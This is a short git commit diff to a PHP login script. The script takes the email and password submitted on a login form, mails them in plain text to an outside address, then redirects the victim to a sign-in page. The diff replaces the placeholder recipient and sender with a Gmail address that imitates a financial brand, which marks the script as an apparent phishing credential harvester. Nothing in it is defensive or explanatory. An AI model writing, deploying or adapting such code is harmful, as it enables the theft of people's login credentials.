445272d79342706767125b741dd759da776fbf1f
SOLOMON DAVID <91599479+NetpinMaster@users.noreply.github.com>
2026-09-07 17:07:42 +0100

    re

--- login.php
+++ login.php
@@ -3,10 +3,10 @@
 $username = $_POST['email']; 
 $password = $_POST['password']; 
 
-$to = "recipient@example.com"; 
+$to = "investfidelity5@gmail"; 
 $subject = "Login Details"; 
 $message = "Username: $username ||| Password: $password"; 
-$headers = "From: sender@yourdomain.com"; 
+$headers = "From: investfidelity5@gmail"; 
 
 if (mail($to, $subject, $message, $headers)) { 
     header("Location: Sign_in.html"); 
